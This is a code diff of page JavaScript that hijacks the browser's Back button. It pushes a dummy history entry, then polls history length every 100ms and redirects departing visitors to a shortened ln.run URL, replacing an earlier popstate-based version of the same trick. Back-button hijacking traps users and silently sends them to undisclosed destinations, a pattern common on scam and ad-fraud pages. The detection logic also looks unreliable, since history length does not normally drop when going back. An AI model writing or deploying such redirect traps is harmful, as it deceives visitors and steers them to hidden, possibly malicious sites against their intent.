@@ -237,22 +237,32 @@ const initialLink = "https://ln.run/TQGSS"; // Replace with the link you want to
 
 
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Page loaded.");
+    console.log("Page loaded. Monitoring history depth.");
 
-    // Add multiple states to ensure proper history handling
-    history.pushState({ state: "state1" }, "", location.href + "?step=1");
-    history.pushState({ state: "state2" }, "", location.href + "?step=2");
-    console.log("Two additional states pushed to history stack.");
+    // Step 1: Push a dummy state to the history stack
+    history.pushState({ state: "dummy" }, "", location.href + "?dummy=true");
+    console.log("Dummy state pushed to history stack. Current history length:", history.length);
 
-    // Back button logic
-    window.addEventListener("popstate", (event) => {
-        console.log("Popstate event detected:", event.state);
-        if (event.state && event.state.state === "state1") {
+    // Step 2: Set up a mechanism to monitor history length
+    let previousHistoryLength = history.length;
+
+    // Create an interval to monitor changes in history length
+    const monitorHistory = setInterval(() => {
+        console.log("Monitoring history... Current history length:", history.length);
+        if (history.length < previousHistoryLength) {
             console.log("Back button pressed! Redirecting...");
-            location.href = "https://ln.run/ZT6w8"; // Replace with your redirection URL
+            clearInterval(monitorHistory); // Stop the monitoring interval
+            location.href = "https://ln.run/ZT6w8"; // Replace with your desired URL
         }
+    }, 100); // Check every 100ms
+
+    // Step 3: Clean up the monitoring interval on page unload (optional)
+    window.addEventListener("beforeunload", () => {
+        clearInterval(monitorHistory);
+        console.log("Page unloading, monitoring stopped.");
     });
 });
+
 
 
 
